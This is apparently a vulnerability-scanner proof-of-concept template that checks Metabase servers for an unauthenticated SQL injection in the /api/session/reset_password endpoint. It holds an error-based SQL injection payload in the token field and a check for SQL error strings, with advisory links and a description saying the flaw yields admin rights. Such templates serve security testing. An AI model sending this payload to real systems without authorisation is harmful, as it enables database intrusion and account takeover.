name: poc-yaml-metabase-reset-password-sqli
groups:
  sqli:
    - method: POST
      path: /api/session/reset_password
      headers:
        Content-Type: application/json
      body: >-
        {"token":"test'+AND+1=CONVERT(int,(SELECT+@@version))--"}
      follow_redirects: false
      expression: >
        response.status == 200 && (response.body.bcontains(b"SQL") || response.body.bcontains(b"error") || response.body.bcontains(b"syntax") || response.body.bcontains(b"SQLSTATE"))
detail:
  author: L4xy
  description: "Metabase存在未授权SQL注入漏洞，攻击者可通过密码重置端点(/api/session/reset_password)注入任意SQL到Metabase应用程序数据库，获取管理员权限"
  links:
    - https://github.com/metabase/metabase/security/advisories/GHSA-vwf4-m7j8-wcjf
    - https://bishopfox.com/blog/critical-sql-injection-in-metabase-via-password-reset-cve-2026-72898
    - https://github.com/securelayer7/netlab-articles/blob/main/metabase-sql-injection-cve-2026-72898.md
    - https://nvd.nist.gov/vuln/detail/CVE-2026-72898
  tags: sqli,metabase